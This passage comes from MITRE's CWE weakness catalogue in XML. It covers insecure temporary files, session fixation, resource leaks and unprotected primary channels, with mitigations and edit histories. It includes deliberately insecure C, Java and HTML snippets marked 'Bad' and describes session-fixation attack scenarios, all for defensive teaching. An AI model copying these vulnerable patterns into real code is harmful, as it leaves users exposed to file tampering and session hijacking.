               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Description, Detection_Factors, Maintenance_Notes, Name, Potential_Mitigations, References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2014-02-18">Privacy Violation</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Exposure of Private Information ('Privacy Violation')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="377" Name="Insecure Temporary File" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>Creating and using insecure temporary files can leave application and system data vulnerable to attack.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a temporary file for storing intermediate data gathered from the network before it is processed.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (tmpnam_r(filename)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>FILE* tmp = fopen(filename,"wb+");<xhtml:br/>while((recv(sock,recvbuf,DATA_SIZE, 0) &gt; 0)&amp;(amt!=0)) amt = fwrite(recvbuf,1,DATA_SIZE,tmp);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This otherwise unremarkable code is vulnerable to a number of different attacks because it relies on an insecure method for creating temporary files. The vulnerabilities introduced by this function and others are described in the following sections. The most egregious security problems related to temporary file creation have occurred on Unix-based operating systems, but Windows applications have parallel risks. This section includes a discussion of temporary file creation on both Unix and Windows systems. Methods and behaviors can vary between systems, but the fundamental risks introduced by each are reasonably constant.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Insecure Temporary File</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>CON33-C</Entry_ID>
               <Entry_Name>Avoid race conditions when using library functions</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO00-J</Entry_ID>
               <Entry_Name>Do not operate on files in shared directories</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="149"/>
            <Related_Attack_Pattern CAPEC_ID="155"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 23, &#34;Creating Temporary Files Securely&#34; Page 682"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Temporary Files&#34;, Page 538"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 11, &#34;File Squatting&#34;, Page 662"/>
         </References>
         <Notes>
            <Note Type="Other">
               <xhtml:p>Applications require temporary files so frequently that many different mechanisms exist for creating them in the C Library and Windows(R) API. Most of these functions are vulnerable to various forms of attacks.</xhtml:p>
               <xhtml:p>The functions designed to aid in the creation of temporary files can be broken into two groups based whether they simply provide a filename or actually open a new file. - Group 1: "Unique" Filenames: The first group of C Library and WinAPI functions designed to help with the process of creating temporary files do so by generating a unique file name for a new temporary file, which the program is then supposed to open. This group includes C Library functions like tmpnam(), tempnam(), mktemp() and their C++ equivalents prefaced with an _ (underscore) as well as the GetTempFileName() function from the Windows API. This group of functions suffers from an underlying race condition on the filename chosen. Although the functions guarantee that the filename is unique at the time it is selected, there is no mechanism to prevent another process or an attacker from creating a file with the same name after it is selected but before the application attempts to open the file. Beyond the risk of a legitimate collision caused by another call to the same function, there is a high probability that an attacker will be able to create a malicious collision because the filenames generated by these functions are not sufficiently randomized to make them difficult to guess. If a file with the selected name is created, then depending on how the file is opened the existing contents or access permissions of the file may remain intact. If the existing contents of the file are malicious in nature, an attacker may be able to inject dangerous data into the application when it reads data back from the temporary file. If an attacker pre-creates the file with relaxed access permissions, then data stored in the temporary file by the application may be accessed, modified or corrupted by an attacker. On Unix based systems an even more insidious attack is possible if the attacker pre-creates the file as a link to another important file. Then, if the application truncates or writes data to the file, it may unwittingly perform damaging operations for the attacker. This is an especially serious threat if the program operates with elevated permissions. Finally, in the best case the file will be opened with the a call to open() using the O_CREAT and O_EXCL flags or to CreateFile() using the CREATE_NEW attribute, which will fail if the file already exists and therefore prevent the types of attacks described above. However, if an attacker is able to accurately predict a sequence of temporary file names, then the application may be prevented from opening necessary temporary storage causing a denial of service (DoS) attack. This type of attack would not be difficult to mount given the small amount of randomness used in the selection of the filenames generated by these functions. - Group 2: "Unique" Files: The second group of C Library functions attempts to resolve some of the security problems related to temporary files by not only generating a unique file name, but also opening the file. This group includes C Library functions like tmpfile() and its C++ equivalents prefaced with an _ (underscore), as well as the slightly better-behaved C Library function mkstemp(). The tmpfile() style functions construct a unique filename and open it in the same way that fopen() would if passed the flags "wb+", that is, as a binary file in read/write mode. If the file already exists, tmpfile() will truncate it to size zero, possibly in an attempt to assuage the security concerns mentioned earlier regarding the race condition that exists between the selection of a supposedly unique filename and the subsequent opening of the selected file. However, this behavior clearly does not solve the function's security problems. First, an attacker can pre-create the file with relaxed access-permissions that will likely be retained by the file opened by tmpfile(). Furthermore, on Unix based systems if the attacker pre-creates the file as a link to another important file, the application may use its possibly elevated permissions to truncate that file, thereby doing damage on behalf of the attacker. Finally, if tmpfile() does create a new file, the access permissions applied to that file will vary from one operating system to another, which can leave application data vulnerable even if an attacker is unable to predict the filename to be used in advance. Finally, mkstemp() is a reasonably safe way create temporary files. It will attempt to create and open a unique file based on a filename template provided by the user combined with a series of randomly generated characters. If it is unable to create such a file, it will fail and return -1. On modern systems the file is opened using mode 0600, which means the file will be secure from tampering unless the user explicitly changes its access permissions. However, mkstemp() still suffers from the use of predictable file names and can leave an application vulnerable to denial of service attacks if an attacker causes mkstemp() to fail by predicting and pre-creating the filenames to be used.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="384" Name="Session Fixation" Abstraction="Compound" Structure="Composite" Status="Incomplete">
         <Description>Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.</Description>
         <Extended_Description>
            <xhtml:p>Such a scenario is commonly observed when:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.</xhtml:li>
               <xhtml:li>An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.</xhtml:li>
               <xhtml:li>The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.</xhtml:li>
            </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="472" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Invalidate any existing session identifiers prior to authorizing a new user session.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate().</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private void auth(LoginContext lc, HttpSession session) throws LoginException {<xhtml:div style="margin-left:1em;">...<xhtml:br/>lc.login();<xhtml:br/>...</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.</Body_Text>
               <Body_Text>In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker.</Body_Text>
               <Body_Text>In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the &lt;code&gt;j_security_check&lt;/code&gt;, which typically does not invalidate the existing session before processing the login request.</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;form method="POST" action="j_security_check"&gt;<xhtml:div style="margin-left:1em;">&lt;input type="text" name="j_username"&gt;<xhtml:br/>&lt;input type="text" name="j_password"&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>37</Entry_ID>
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="196"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="61"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Notes>
            <Note Type="Other">Other attack vectors include DNS poisoning and related network based attacks where an attacker causes the user to visit a malicious site by redirecting a request for a valid site. Network based attacks typically involve a physical presence on the victim's network or control of a compromised machine on the network, which makes them harder to exploit remotely, but their significance should not be overlooked. Less secure session management mechanisms, such as the default implementation in Apache Tomcat, allow session identifiers normally expected in a cookie to be specified on the URL as well, which enables an attacker to cause a victim to use a fixed session identifier simply by emailing a malicious URL.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="402" Name="Transmission of Private Resources into a New Sphere ('Resource Leak')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product makes resources available to untrusted parties when those resources are only intended to be accessed by the product.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Resource Leak</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Resource leaks</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Resource Leaks</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Transmission of Private Resources into a New Sphere (aka 'Resource Leak')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="419" Name="Unprotected Primary Channel" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not expose administrative functionnality on the user UI.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect the administrative/restricted functionality with a strong authentication mechanism.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Unprotected Primary Channel</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="383"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
            </Modification>
            <Modification>
